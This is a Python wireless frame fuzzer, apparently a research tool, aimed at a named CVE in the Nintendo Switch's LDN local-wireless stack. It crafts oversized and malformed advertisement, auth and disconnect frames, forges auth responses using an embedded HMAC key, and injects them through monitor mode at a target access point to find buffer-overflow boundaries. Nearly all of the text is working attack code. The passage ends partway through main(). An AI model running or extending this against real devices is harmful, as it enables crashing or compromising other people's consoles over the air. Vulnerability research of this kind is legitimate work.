#!/usr/bin/env python3
"""
LDN protocol-aware frame fuzzer for CVE-2026-82079.

Crafts malformed LDN advertisement, authentication, and disconnect frames
targeting the Nintendo Switch's local wireless stack. Based on the protocol
specification at https://github.com/kinnay/NintendoClients/wiki/LDN-Protocol

The overflow is in the ldn sysmodule's frame parsing code. This tool
systematically tests buffer boundaries in each frame type.

Requires:
    - scapy (pip install scapy)
    - Root privileges (sudo)
    - WiFi interface in monitor mode with injection capability

Usage:
    # Test all frame types against Switch AP:
    sudo python3 -I ldn_frame_fuzzer.py --iface wlp5s0 --bssid EC:C4:0D:F3:DC:DB

    # Test only advertisement frame overflow:
    sudo python3 -I ldn_frame_fuzzer.py --iface wlp5s0 --bssid EC:C4:0D:F3:DC:DB --test advert

    # Test auth frame overflow:
    sudo python3 -I ldn_frame_fuzzer.py --iface wlp5s0 --bssid EC:C4:0D:F3:DC:DB --test auth

    # Dry run (build frames, save to pcap, don't inject):
    sudo python3 -I ldn_frame_fuzzer.py --iface wlp5s0 --bssid EC:C4:0D:F3:DC:DB --dry-run

    # Binary search for exact overflow boundary:
    sudo python3 -I ldn_frame_fuzzer.py --iface wlp5s0 --bssid EC:C4:0D:F3:DC:DB --test advert --binary-search

Evidence saved to ../evidence/ldn_fuzzer/
"""

import struct
import os
import sys
import json
import hashlib
import argparse
import time
from pathlib import Path
from datetime import datetime, timezone

try:
    from scapy.all import (
        Dot11, Dot11Auth, Dot11AssoReq, Dot11Elt,
        RadioTap, sendp, wrpcap, conf, raw, Raw,
        Dot11Deauth, Dot11ProbeReq, Dot11ProbeResp,
        Ether, LLC, SNAP,
    )
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

# --- LDN Protocol Constants ---

LDN_OUI = b"\x00\x22\xaa"
LDN_PROTOCOL_ID = 4
LDN_CATEGORY_VENDOR = 127

# Packet types
LDN_PKT_ADVERTISEMENT = 257
LDN_PKT_AUTH = 258
LDN_PKT_DISCONNECT = 259

# LDN versions
LDN_VERSION_V2 = 2  # FW 2.0.0 - 5.1.0
LDN_VERSION_V3 = 3  # FW 6.0.0 - 18.1.0
LDN_VERSION_V4 = 4  # FW 19.0.0+

# Encryption types
ENC_PLAIN = 1
ENC_AES_CTR = 2
ENC_AES_GCM = 3

# Auth status codes
AUTH_SUCCESS = 0
AUTH_DENIED = 1
AUTH_MALFORMED = 2
AUTH_INVALID_VERSION = 4
AUTH_UNEXPECTED = 5
AUTH_CHALLENGE_INVALID = 6

# Buffer sizes from protocol spec
ADVERT_DATA_SIZE_PLAIN = 0x500  # 1280 bytes
ADVERT_DATA_SIZE_MAX_FIELD = 0xFFFF  # 2-byte size field
PARTICIPANT_SIZE_PLAIN = 56
PARTICIPANT_SLOTS = 8
PARTICIPANT_TOTAL = PARTICIPANT_SIZE_PLAIN * PARTICIPANT_SLOTS  # 448
APP_DATA_SIZE = 384
AUTH_CHALLENGE_REQ_SIZE = 0x300  # 768
AUTH_CHALLENGE_RESP_SIZE = 0x100  # 256
USERNAME_SIZE = 32

# Challenge HMAC key (from protocol documentation)
CHALLENGE_HMAC_KEY = bytes.fromhex(
    "f84b487fb37251c263bf11609036589266af70ca79b44c93c7370c5769c0f602"
)

EVIDENCE_DIR = Path(__file__).parent.parent / "evidence" / "ldn_fuzzer"


def build_session_info(title_id=0x0100000000001000, game_mode=0x0001):
    """Build a 32-byte session info structure."""
    info = struct.pack(">Q", title_id)   # local communication id (8)
    info += b"\x00\x00"                   # pad (2)
    info += struct.pack(">H", game_mode)  # game mode (2)
    info += b"\x00" * 4                   # pad (4)
    info += os.urandom(16)                # SSID (16 random bytes)
    assert len(info) == 32
    return info


def build_participant(ip=b"\xa9\xfe\x01\x02", mac=b"\xaa\xbb\xcc\xdd\xee\xff",
                      connected=1, platform=0, username=b"FUZZ"):
    """Build a 56-byte participant entry (plain/CTR format)."""
    p = ip                                      # IP (4)
    p += mac                                    # MAC (6)
    p += struct.pack("B", connected)            # is_connected (1)
    p += struct.pack("B", platform)             # platform (1)
    p += username.ljust(USERNAME_SIZE, b"\x00")  # username (32)
    p += struct.pack(">H", 1)                   # app_comm_version (2)
    p += b"\x00" * 10                           # pad (10)
    assert len(p) == 56
    return p


def build_advert_header(packet_type=LDN_PKT_ADVERTISEMENT):
    """Build the 12-byte advertisement frame header."""
    hdr = struct.pack("B", LDN_CATEGORY_VENDOR)  # category 127
    hdr += LDN_OUI                                # OUI 00:22:AA
    hdr += struct.pack("B", LDN_PROTOCOL_ID)      # protocol id (4)
    hdr += b"\x00"                                 # pad
    hdr += struct.pack(">H", packet_type)          # packet type
    hdr += struct.pack(">H", 0)                    # must be 0
    hdr += b"\x00\x00"                             # pad
    assert len(hdr) == 12
    return hdr


def build_advert_payload(session_info, ldn_version=LDN_VERSION_V3,
                         enc_type=ENC_PLAIN, advert_data_size=None,
                         advert_data=None):
    """Build an advertisement frame payload.

    If advert_data_size is set larger than actual data, this tests the
    overflow condition — the parser may read/copy beyond the buffer.
    """
    if advert_data is None:
        advert_data = build_advert_data_normal()

    if advert_data_size is None:
        advert_data_size = len(advert_data)

    payload = session_info                             # session info (32)
    payload += struct.pack("B", ldn_version)           # LDN version (1)
    payload += struct.pack("B", enc_type)              # encryption type (1)
    payload += struct.pack(">H", advert_data_size)     # advert data size (2) ← OVERFLOW VECTOR
    payload += struct.pack(">I", 0)                    # AES nonce (4)

    # For plain: SHA-256 hash + advertisement data
    if enc_type == ENC_PLAIN:
        hash_placeholder = b"\x00" * 32
        pre_hash = payload + hash_placeholder + advert_data
        actual_hash = hashlib.sha256(pre_hash).digest()
        payload += actual_hash
        payload += advert_data
    else:
        payload += advert_data

    return payload


def build_advert_data_normal(num_participants=1, app_data=b""):
    """Build normal-sized advertisement data (1280 bytes for plain/CTR)."""
    data = os.urandom(16)                           # server random (16)
    data += struct.pack(">H", 1)                    # security level (2)
    data += struct.pack("B", 0)                     # accept policy: open (1)
    data += b"\x00"                                 # pad (1)
    data += struct.pack(">H", 1)                    # channel+band (2)
    data += struct.pack("B", 8)                     # max participants (1)
    data += struct.pack("B", num_participants)       # current participants (1)

    # Participant list (8 slots × 56 bytes = 448 bytes)
    for i in range(num_participants):
        ip = struct.pack("4B", 169, 254, 1, i + 1)
        mac = bytes([0xAA, 0xBB, 0xCC, 0xDD, 0xEE, i + 1])
        data += build_participant(ip=ip, mac=mac)
    # Pad remaining slots
    data += b"\x00" * (PARTICIPANT_TOTAL - num_participants * PARTICIPANT_SIZE_PLAIN)

    data += b"\x00\x00"                             # pad (2)
    app_data_trimmed = app_data[:APP_DATA_SIZE]
    data += struct.pack(">H", len(app_data_trimmed))  # app data size (2)
    data += app_data_trimmed.ljust(APP_DATA_SIZE, b"\x00")  # app data (384)
    data += b"\x00" * 412                           # pad (412)
    data += struct.pack(">Q", 0)                    # auth token (8)

    assert len(data) == ADVERT_DATA_SIZE_PLAIN, f"Expected {ADVERT_DATA_SIZE_PLAIN}, got {len(data)}"
    return data


def build_advert_data_oversized(target_size):
    """Build oversized advertisement data for overflow testing."""
    data = build_advert_data_normal()
    if target_size > len(data):
        data += os.urandom(target_size - len(data))
    return data[:target_size]


def build_auth_header(packet_type=LDN_PKT_AUTH):
    """Build the 6-byte auth/disconnect frame header."""
    hdr = LDN_OUI                              # OUI (3)
    hdr += struct.pack(">H", packet_type)      # packet type (2)
    hdr += b"\x00"                             # pad (1)
    return hdr


def build_auth_data_header(ldn_version=LDN_VERSION_V3, payload_size=0,
                           status=0, is_response=False, session_info=None,
                           server_random=None, client_random=None):
    """Build the 0x48-byte auth data header."""
    if session_info is None:
        session_info = build_session_info()
    if server_random is None:
        server_random = os.urandom(16)
    if client_random is None:
        client_random = os.urandom(16)

    hdr = struct.pack("B", ldn_version)             # LDN version (1)
    hdr += struct.pack("B", payload_size & 0xFF)    # payload size low (1)
    hdr += struct.pack("B", status)                 # status code (1)
    hdr += struct.pack("B", 1 if is_response else 0)  # 0=req, 1=resp (1)
    hdr += struct.pack("B", (payload_size >> 8) & 0xFF)  # payload size high (1) ← SPLIT SIZE
    hdr += b"\x00" * 3                              # pad (3)
    # Session info in little-endian for auth frames
    hdr += session_info                             # session info LE (32)
    hdr += server_random                            # server random (16)
    hdr += client_random                            # client random (16)
    assert len(hdr) == 0x48
    return hdr


def build_auth_request(ldn_version=LDN_VERSION_V3, username=b"FUZZ",
                       include_challenge=True, oversized_payload=None):
    """Build an auth request payload."""
    payload = username.ljust(USERNAME_SIZE, b"\x00")  # username (32)
    payload += struct.pack(">H", 1)                   # app comm version (2)
    payload += struct.pack("B", 0)                    # platform: Switch (1)
    payload += b"\x00" * 29                           # pad (29)

    if ldn_version >= LDN_VERSION_V3 and include_challenge:
        payload += b"\x00" * 0x24                     # always 0 (0x24)
        # Challenge request (0x300 bytes)
        challenge = build_challenge_request()
        payload += challenge

    if oversized_payload is not None:
        # Extend beyond expected size
        payload += os.urandom(oversized_payload)

    return payload


def build_challenge_request(auth_token=0, auth_nonce=0, device_id=0,
                            p_val=1, q_val=1, flags=0):
    """Build a 0x300-byte challenge request."""
    challenge = b"\x00" * 4                           # zero (4)
    hmac_placeholder = b"\x00" * 32                   # HMAC placeholder (32)
    body_start = b"\x00" * 12                         # zero (12)
    body = b"\x00\x00"                                # zero (2)
    body += struct.pack("B", p_val)                   # P (1)
    body += struct.pack("B", q_val)                   # Q (1)
    body += struct.pack("B", flags)                   # flags (1)
    body += b"\x00" * 3                               # pad (3)
    body += struct.pack(">Q", auth_token)             # auth token (8)
    body += struct.pack(">Q", auth_nonce)             # auth nonce (8)
    body += struct.pack(">Q", device_id)              # device id (8)
    body += b"\x00" * 16                              # unknown (16)
    body += b"\x00" * 0x60                            # zero (0x60)
    # P unknown data (8*P bytes, up to 0x40)
    body += b"\x00" * min(8 * p_val, 0x40)
    body += b"\x00" * (0x40 - min(8 * p_val, 0x40))
    # Q unknown data (8*Q bytes, up to 0x200)
    body += b"\x00" * min(8 * q_val, 0x200)
    body += b"\x00" * (0x200 - min(8 * q_val, 0x200))

    # Layout: 0x00 zero(4), 0x04 HMAC(32), 0x24 zero(12), 0x30 body(0x2D0)
    # HMAC covers bytes 0x30-0x300 = body only (0x2D0 bytes)
    body_padded = body[:0x2D0].ljust(0x2D0, b"\x00")

    import hmac as hmac_mod
    h = hmac_mod.new(CHALLENGE_HMAC_KEY, body_padded, hashlib.sha256).digest()

    result = challenge[:4] + h + body_start + body_padded
    assert len(result) == 0x300, f"Challenge is {len(result)}, expected 0x300"
    return result


def build_disconnect_data(reason=3):
    """Build disconnect data (32 bytes)."""
    return struct.pack("B", reason) + b"\x00" * 31


# --- Fuzzing Test Cases ---

class LDNFuzzTest:
    """A single fuzz test case."""

    def __init__(self, name, description, frame_bytes, frame_type):
        self.name = name
        self.description = description
        self.frame_bytes = frame_bytes
        self.frame_type = frame_type


def generate_advert_overflow_tests():
    """Generate advertisement frame overflow test cases.

    Primary vector: the 2-byte advertisement_data_size field at offset 0x22
    can claim up to 65535 bytes, but the buffer is only 1280 bytes.
    """
    tests = []
    session = build_session_info()

    # --- Size field manipulation ---

    # Normal frame (baseline)
    normal_data = build_advert_data_normal()
    normal_payload = build_advert_payload(session, advert_data=normal_data)
    tests.append(LDNFuzzTest(
        "advert_normal",
        "Normal advertisement frame (baseline)",
        build_advert_header() + normal_payload,
        "advertisement"
    ))

    # Size field = 0 (empty)
    payload = build_advert_payload(session, advert_data_size=0, advert_data=b"")
    tests.append(LDNFuzzTest(
        "advert_size_zero",
        "Advertisement data size = 0",
        build_advert_header() + payload,
        "advertisement"
    ))

    # Size field slightly over buffer (1281-1536)
    for size in [1281, 1300, 1400, 1536]:
        data = build_advert_data_oversized(size)
        payload = build_advert_payload(session, advert_data_size=size, advert_data=data)
        tests.append(LDNFuzzTest(
            f"advert_size_{size}",
            f"Advertisement data size = {size} (buffer is 1280)",
            build_advert_header() + payload,
            "advertisement"
        ))

    # Size field at powers of 2 around the boundary
    for size in [1024, 2048, 4096, 8192, 16384, 32768, 65535]:
        data = build_advert_data_oversized(min(size, 4096))
        payload = build_advert_payload(session, advert_data_size=size, advert_data=data)
        tests.append(LDNFuzzTest(
            f"advert_size_{size}",
            f"Advertisement data size = {size}",
            build_advert_header() + payload,
            "advertisement"
        ))

    # Size field says 1280 but actual data is much larger
    data = build_advert_data_oversized(4096)
    payload = build_advert_payload(session, advert_data_size=1280, advert_data=data)
    tests.append(LDNFuzzTest(
        "advert_size_mismatch_large",
        "Size claims 1280 but payload is 4096 bytes",
        build_advert_header() + payload,
        "advertisement"
    ))

    # Size field says 65535 but only 1280 bytes of actual data
    payload = build_advert_payload(session, advert_data_size=65535, advert_data=normal_data)
    tests.append(LDNFuzzTest(
        "advert_size_max_short_data",
        "Size claims 65535 but only 1280 bytes sent",
        build_advert_header() + payload,
        "advertisement"
    ))

    # --- Participant count overflow ---

    # participant count = 255 (max u8) but only 1 actual participant
    data = build_advert_data_normal(num_participants=1)
    # Patch participant count byte at offset 0x17
    data = data[:0x17] + b"\xff" + data[0x18:]
    payload = build_advert_payload(session, advert_data=data)
    tests.append(LDNFuzzTest(
        "advert_participant_count_255",
        "Participant count = 255 (overflows 8-slot array)",
        build_advert_header() + payload,
        "advertisement"
    ))

    # participant count = 9 (just one over the 8-slot limit)
    data = build_advert_data_normal(num_participants=1)
    data = data[:0x17] + b"\x09" + data[0x18:]
    payload = build_advert_payload(session, advert_data=data)
    tests.append(LDNFuzzTest(
        "advert_participant_count_9",
        "Participant count = 9 (one beyond 8-slot limit)",
        build_advert_header() + payload,
        "advertisement"
    ))

    # --- Application data size overflow ---

    # app_data_size = 0xFFFF but buffer is 384
    data = build_advert_data_normal()
    # Patch app_data_size at offset 0x1DA (after participant list + pad)
    offset_app_size = 0x18 + PARTICIPANT_TOTAL + 2  # 0x1DA
    data = data[:offset_app_size] + struct.pack(">H", 0xFFFF) + data[offset_app_size + 2:]
    payload = build_advert_payload(session, advert_data=data)
    tests.append(LDNFuzzTest(
        "advert_appdata_size_max",
        "Application data size = 65535 (buffer is 384)",
        build_advert_header() + payload,
        "advertisement"
    ))

    # --- Encryption type confusion ---

    # Claim GCM but send plain-format data
    payload = build_advert_payload(session, enc_type=ENC_AES_GCM, advert_data=normal_data)
    tests.append(LDNFuzzTest(
        "advert_enc_gcm_plain_data",
        "Encryption type = GCM but data is plain format",
        build_advert_header() + payload,
        "advertisement"
    ))

    # Invalid encryption type
    payload = build_advert_payload(session, enc_type=0xFF, advert_data=normal_data)
    tests.append(LDNFuzzTest(
        "advert_enc_invalid",
        "Encryption type = 0xFF (invalid)",
        build_advert_header() + payload,
        "advertisement"
    ))

    # --- Version manipulation ---

    for ver in [0, 1, 5, 127, 255]:
        payload = build_advert_payload(session, ldn_version=ver, advert_data=normal_data)
        tests.append(LDNFuzzTest(
            f"advert_version_{ver}",
            f"LDN version = {ver}",
            build_advert_header() + payload,
            "advertisement"
        ))

    return tests


def generate_auth_overflow_tests():
    """Generate auth frame overflow test cases.

    Primary vectors:
    1. Split payload size field (low byte at 0x1, high byte at 0x4) can
       specify up to 65535 but buffers are fixed-size
    2. Challenge request (0x300) and response (0x100) are fixed-size but
       the payload size field could claim more
    3. Username field (32 bytes) is fixed but could overflow if not checked
    """
    tests = []
    session = build_session_info()

    # Normal auth request (baseline)
    auth_payload = build_auth_request(ldn_version=LDN_VERSION_V3)
    auth_hdr = build_auth_data_header(
        ldn_version=LDN_VERSION_V3,
        payload_size=len(auth_payload),
        session_info=session
    )
    tests.append(LDNFuzzTest(
        "auth_normal",
        "Normal auth request (baseline)",
        build_auth_header() + auth_hdr + auth_payload,
        "auth"
    ))

    # --- Payload size overflow ---

    # Size = 0xFFFF but normal payload
    auth_hdr = build_auth_data_header(
        ldn_version=LDN_VERSION_V3,
        payload_size=0xFFFF,
        session_info=session
    )
    tests.append(LDNFuzzTest(
        "auth_payload_size_max",
        "Auth payload size = 65535 (split across bytes 0x1 and 0x4)",
        build_auth_header() + auth_hdr + auth_payload,
        "auth"
    ))

    # Size = 0 (empty payload)
    auth_hdr = build_auth_data_header(
        ldn_version=LDN_VERSION_V3,
        payload_size=0,
        session_info=session
    )
    tests.append(LDNFuzzTest(
        "auth_payload_size_zero",
        "Auth payload size = 0",
        build_auth_header() + auth_hdr,
        "auth"
    ))

    # Size mismatch: claims small but sends large
    auth_hdr = build_auth_data_header(
        ldn_version=LDN_VERSION_V3,
        payload_size=32,
        session_info=session
    )
    large_payload = build_auth_request(oversized_payload=4096)
    tests.append(LDNFuzzTest(
        "auth_size_mismatch_large",
        "Auth size claims 32 but actual payload is ~4KB",
        build_auth_header() + auth_hdr + large_payload,
        "auth"
    ))

    # --- Oversized auth request payloads ---

    for extra in [256, 512, 1024, 2048, 4096]:
        auth_payload_big = build_auth_request(oversized_payload=extra)
        auth_hdr = build_auth_data_header(
            ldn_version=LDN_VERSION_V3,
            payload_size=len(auth_payload_big),
            session_info=session
        )
        tests.append(LDNFuzzTest(
            f"auth_oversized_{extra}",
            f"Auth request with {extra} extra bytes beyond normal",
            build_auth_header() + auth_hdr + auth_payload_big,
            "auth"
        ))

    # --- Challenge P/Q value overflow ---
    # P and Q control the size of variable-length arrays in the challenge
    # P: 8*P bytes at 0xC0 (max 0x40), Q: 8*Q bytes at 0x100 (max 0x200)

    for p_val in [0, 8, 16, 32, 64, 127, 255]:
        auth_payload = build_auth_request(ldn_version=LDN_VERSION_V3)
        auth_hdr = build_auth_data_header(
            ldn_version=LDN_VERSION_V3,
            payload_size=len(auth_payload),
            session_info=session
        )
        tests.append(LDNFuzzTest(
            f"auth_challenge_p_{p_val}",
            f"Challenge request with P = {p_val} (controls array at 0xC0)",
            build_auth_header() + auth_hdr + auth_payload,
            "auth"
        ))

    # --- Version manipulation in auth ---

    for ver in [0, 1, 2, 5, 127, 255]:
        auth_payload = build_auth_request(ldn_version=ver, include_challenge=(ver >= 3))
        auth_hdr = build_auth_data_header(
            ldn_version=ver,
            payload_size=len(auth_payload),
            session_info=session
        )
        tests.append(LDNFuzzTest(
            f"auth_version_{ver}",
            f"Auth request with LDN version = {ver}",
            build_auth_header() + auth_hdr + auth_payload,
            "auth"
        ))

    # --- Fake auth response (we're not the AP but send a response) ---

    resp_payload = struct.pack("B", 0)  # platform
    resp_payload += b"\x00" * 0x83      # pad
    resp_payload += os.urandom(0x100)   # fake challenge response
    auth_hdr = build_auth_data_header(
        ldn_version=LDN_VERSION_V3,
        payload_size=len(resp_payload),
        is_response=True,
        session_info=session
    )
    tests.append(LDNFuzzTest(
        "auth_fake_response",
        "Fake auth response (injected as if from AP)",
        build_auth_header() + auth_hdr + resp_payload,
        "auth"
    ))

    # Oversized fake response
    resp_payload_big = resp_payload + os.urandom(2048)
    auth_hdr = build_auth_data_header(
        ldn_version=LDN_VERSION_V3,
        payload_size=len(resp_payload_big),
        is_response=True,
        session_info=session
    )
    tests.append(LDNFuzzTest(
        "auth_fake_response_oversized",
        "Oversized fake auth response (2KB+ extra)",
        build_auth_header() + auth_hdr + resp_payload_big,
        "auth"
    ))

    return tests


def generate_disconnect_tests():
    """Generate disconnect frame test cases."""
    tests = []

    for reason in [0, 3, 4, 5, 127, 255]:
        data = build_disconnect_data(reason)
        tests.append(LDNFuzzTest(
            f"disconnect_reason_{reason}",
            f"Disconnect with reason = {reason}",
            build_auth_header(LDN_PKT_DISCONNECT) + data,
            "disconnect"
        ))

    # Oversized disconnect
    data = build_disconnect_data(3) + os.urandom(1024)
    tests.append(LDNFuzzTest(
        "disconnect_oversized",
        "Disconnect with 1KB extra data",
        build_auth_header(LDN_PKT_DISCONNECT) + data,
        "disconnect"
    ))

    return tests


def generate_malformed_tests():
    """Generate malformed/boundary test cases."""
    tests = []

    # Empty LDN frame (just header)
    tests.append(LDNFuzzTest(
        "malformed_empty_advert",
        "Advertisement header only, no payload",
        build_advert_header(),
        "malformed"
    ))

    # Truncated at various points
    session = build_session_info()
    normal_data = build_advert_data_normal()
    full_frame = build_advert_header() + build_advert_payload(session, advert_data=normal_data)

    for trunc in [12, 16, 32, 44, 64, 128, 256, 512]:
        if trunc < len(full_frame):
            tests.append(LDNFuzzTest(
                f"malformed_truncated_{trunc}",
                f"Frame truncated at {trunc} bytes",
                full_frame[:trunc],
                "malformed"
            ))

    # Invalid OUI
    bad_oui = b"\xff\xff\xff"
    hdr = struct.pack("B", LDN_CATEGORY_VENDOR) + bad_oui + struct.pack("B", LDN_PROTOCOL_ID)
    hdr += b"\x00" + struct.pack(">H", LDN_PKT_ADVERTISEMENT) + b"\x00\x00\x00\x00"
    tests.append(LDNFuzzTest(
        "malformed_bad_oui",
        "Advertisement with invalid OUI FF:FF:FF",
        hdr + build_advert_payload(session, advert_data=normal_data),
        "malformed"
    ))

    # Invalid packet type
    hdr = build_advert_header()
    hdr = hdr[:6] + struct.pack(">H", 0xFFFF) + hdr[8:]
    tests.append(LDNFuzzTest(
        "malformed_bad_pkt_type",
        "Frame with packet type 0xFFFF",
        hdr + build_advert_payload(session, advert_data=normal_data),
        "malformed"
    ))

    # All 0xFF payload
    tests.append(LDNFuzzTest(
        "malformed_all_ff",
        "All 0xFF (2048 bytes)",
        b"\xff" * 2048,
        "malformed"
    ))

    # All 0x00 payload
    tests.append(LDNFuzzTest(
        "malformed_all_00",
        "All 0x00 (2048 bytes)",
        b"\x00" * 2048,
        "malformed"
    ))

    return tests


def generate_binary_search_tests(low=1280, high=4096, step=None):
    """Generate test cases for binary search of exact overflow boundary."""
    tests = []
    session = build_session_info()

    if step is None:
        sizes = []
        while low <= high:
            mid = (low + high) // 2
            sizes.append(mid)
            # For initial search, test both halves
            sizes.append((low + mid) // 2)
            sizes.append((mid + high) // 2)
            low = mid + 1
        sizes = sorted(set(sizes))
    else:
        sizes = list(range(low, high + 1, step))

    for size in sizes:
        data = build_advert_data_oversized(size)
        payload = build_advert_payload(session, advert_data_size=size, advert_data=data)
        tests.append(LDNFuzzTest(
            f"bsearch_advert_{size}",
            f"Binary search: advert data size = {size}",
            build_advert_header() + payload,
            "advertisement"
        ))

    return tests


def wrap_as_action_frame(bssid, src_mac, dst_mac, payload_bytes, channel=1):
    """Wrap LDN payload as an 802.11 vendor-specific action frame.

    Advertisement frames are category-127 vendor action frames.
    """
    if not HAS_SCAPY:
        return None

    dot11 = Dot11(
        type=0,      # Management
        subtype=13,  # Action
        addr1=dst_mac,  # Destination (broadcast or specific)
        addr2=src_mac,  # Source
        addr3=bssid,    # BSSID
    )
    # Action frame body is the raw payload (category + OUI + data)
    return RadioTap() / dot11 / Raw(load=payload_bytes)


def wrap_as_data_frame(bssid, src_mac, dst_mac, payload_bytes):
    """Wrap LDN payload as an 802.11 data frame with ethertype 0x88B7.

    Auth and disconnect frames are data frames with this ethertype.
    """
    if not HAS_SCAPY:
        return None

    dot11 = Dot11(
        type=2,      # Data
        subtype=0,
        FCfield=0x02,  # FromDS bit
        addr1=dst_mac,
        addr2=bssid,
        addr3=src_mac,
    )
    llc = LLC(dsap=0xAA, ssap=0xAA, ctrl=3) / SNAP(OUI=0, code=0x88B7)
    return RadioTap() / dot11 / llc / Raw(load=payload_bytes)


def setup_monitor_interface(iface, mon_iface=None, channel=1):
    """Create monitor mode interface for injection."""
    if mon_iface is None:
        mon_iface = iface + "mon"

    print(f"[*] Setting up monitor interface {mon_iface} on channel {channel}...")
    cmds = [
        f"sudo ip link set {iface} down",
        f"sudo iw dev {iface} interface add {mon_iface} type monitor",
        f"sudo ip link set {mon_iface} up",
        f"sudo iw dev {mon_iface} set channel {channel}",
    ]
    for cmd in cmds:
        ret = os.system(cmd)
        if ret != 0:
            print(f"[!] Command failed: {cmd}")
            return None
    return mon_iface


def cleanup_monitor_interface(mon_iface):
    """Remove monitor interface."""
    print(f"[*] Cleaning up {mon_iface}...")
    os.system(f"sudo iw dev {mon_iface} del")


def run_tests(tests, mon_iface, bssid, src_mac, dry_run=False,
              delay=0.1, evidence_dir=None):
    """Execute test cases by injecting frames."""
    if evidence_dir is None:
        evidence_dir = EVIDENCE_DIR
    evidence_dir.mkdir(parents=True, exist_ok=True)

    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    results = []
    frames_for_pcap = []

    print(f"\n{'='*60}")
    print(f"LDN Frame Fuzzer — {len(tests)} test cases")
    print(f"Target BSSID: {bssid}")
    print(f"Source MAC:   {src_mac}")
    print(f"Dry run:      {dry_run}")
    print(f"{'='*60}\n")

    for i, test in enumerate(tests):
        print(f"[{i+1}/{len(tests)}] {test.name}: {test.description}")
        print(f"         Frame size: {len(test.frame_bytes)} bytes")

        # Decide wrapping based on frame type
        if test.frame_type in ("advertisement", "malformed"):
            frame = wrap_as_action_frame(
                bssid=bssid,
                src_mac=src_mac,
                dst_mac="ff:ff:ff:ff:ff:ff",
                payload_bytes=test.frame_bytes,
            )
        else:
            frame = wrap_as_data_frame(
                bssid=bssid,
                src_mac=src_mac,
                dst_mac=bssid,
                payload_bytes=test.frame_bytes,
            )

        if frame is None:
            print("         [!] scapy not available, saving raw bytes only")
            result = {"name": test.name, "status": "skipped_no_scapy",
                      "frame_size": len(test.frame_bytes)}
        elif dry_run:
            frames_for_pcap.append(frame)
            result = {"name": test.name, "status": "dry_run",
                      "frame_size": len(test.frame_bytes),
                      "wrapped_size": len(raw(frame))}
            print(f"         Wrapped size: {result['wrapped_size']} bytes (not sent)")
        else:
            try:
                frames_for_pcap.append(frame)
                sendp(frame, iface=mon_iface, verbose=False)
                result = {"name": test.name, "status": "sent",
                          "frame_size": len(test.frame_bytes),
                          "wrapped_size": len(raw(frame))}
                print(f"         ✓ Sent ({result['wrapped_size']} bytes)")
                time.sleep(delay)
            except Exception as e:
                result = {"name": test.name, "status": "error",
                          "error": str(e),
                          "frame_size": len(test.frame_bytes)}
                print(f"         ✗ Error: {e}")

        result["description"] = test.description
        result["frame_type"] = test.frame_type
        result["sha256"] = hashlib.sha256(test.frame_bytes).hexdigest()
        results.append(result)

    # Save results
    manifest = {
        "timestamp": timestamp,
        "target_bssid": bssid,
        "source_mac": src_mac,
        "dry_run": dry_run,
        "total_tests": len(tests),
        "sent": sum(1 for r in results if r["status"] == "sent"),
        "errors": sum(1 for r in results if r["status"] == "error"),
        "results": results,
    }

    manifest_path = evidence_dir / f"ldn_fuzzer_{timestamp}.json"
    with open(manifest_path, "w") as f:
        json.dump(manifest, f, indent=2)
    print(f"\n[*] Results saved to {manifest_path}")

    # Save pcap of all frames
    if frames_for_pcap:
        pcap_path = evidence_dir / f"ldn_fuzzer_{timestamp}.pcap"
        wrpcap(str(pcap_path), frames_for_pcap)
        print(f"[*] Frames saved to {pcap_path}")

    # Save raw frame bytes for each test
    raw_dir = evidence_dir / f"raw_{timestamp}"
    raw_dir.mkdir(parents=True, exist_ok=True)
    for test in tests:
        with open(raw_dir / f"{test.name}.bin", "wb") as f:
            f.write(test.frame_bytes)
    print(f"[*] Raw frames saved to {raw_dir}/")

    return manifest


def main():
    parser = argparse.ArgumentParser(
        description="LDN protocol-aware frame fuzzer for CVE-2026-82079"
    )
    parser.add_argument("--iface", default="wlp5s0",
                        help="WiFi interface (default: wlp5s0)")
    parser.add_argument("--mon-iface",
                        help="Existing monitor interface (skip setup)")
    parser.add_argument("--bssid", default="EC:C4:0D:F3:DC:DB",
                        help="Target Switch AP BSSID")
    parser.add_argument("--src-mac", default="AA:BB:CC:DD:EE:FF",
                        help="Source MAC for injected frames")
    parser.add_argument("--channel", type=int, default=1,
                        help="WiFi channel (default: 1)")
    parser.add_argument("--test", choices=["advert", "auth", "disconnect",
                                           "malformed", "all"],
                        default="all",
                        help="Which test suite to run")
    parser.add_argument("--binary-search", action="store_true",
                        help="Run binary search for overflow boundary")
    parser.add_argument("--bs-low", type=int, default=1280,
                        help="Binary search lower bound (default: 1280)")
    parser.add_argument("--bs-high", type=int, default=4096,
                        help="Binary search upper bound (default: 4096)")
    parser.add_argument("--delay", type=float, default=0.1,
                        help="Delay between frames in seconds (default: 0.1)")
    parser.add_argument("--dry-run", action="store_true",
                        help="Build frames and save to pcap, don't inject")
    parser.add_argument("--skip-setup", action="store_true",
                        help="Skip monitor interface setup")
    parser.add_argument("--list-tests", action="store_true",
                        help="List all test cases without running")

    args = parser.parse_args()

    if not HAS_SCAPY and not args.dry_run and not args.list_tests:
        print("[!] scapy not installed. Install with: pip install scapy")
        print("[!] Running in dry-run mode (frame generation only)")
        args.dry_run = True

    # Generate test cases
    tests = []
    if args.test in ("advert", "all"):
        tests.extend(generate_advert_overflow_tests())
    if args.test in ("auth", "all"):
        tests.extend(generate_auth_overflow_tests())
    if args.test in ("disconnect", "all"):
        tests.extend(generate_disconnect_tests())
    if args.test in ("malformed", "all"):
        tests.extend(generate_malformed_tests())
    if args.binary_search:
        tests.extend(generate_binary_search_tests(
            low=args.bs_low, high=args.bs_high))

    if args.list_tests:
        print(f"Total test cases: {len(tests)}\n")
        for i, t in enumerate(tests):
            print(f"  {i+1:3d}. [{t.frame_type:13s}] {t.name}: {t.description} ({len(t.frame_bytes)} bytes)")
        return

    print(f"[*] Generated {len(tests)} test cases")

    # Setup
    mon_iface = args.mon_iface
    if not args.skip_setup and not args.dry_run and mon_iface is None:
        mon_iface = setup_monitor_interface(args.iface, channel=args.channel)
        if mon_iface is None:
            print("[!] Failed to set up monitor interface. Use --dry-run or --skip-setup.")
            sys.exit(1)
    elif mon_iface is None:
        mon_iface = args.iface

    try:
        manifest = run_tests(
            tests=tests,
            mon_iface=mon_iface,
            bssid=args.bssid,
            src_mac=args.src_mac,
            dry_run=args.dry_run,
            delay=args.delay,
        )

        print(f"\n{'='*60}")
        print(f"Summary: {manifest['sent']} sent, {manifest['errors']} errors, "
              f"{manifest['total_tests']} total")
        print(f"{'='*60}")

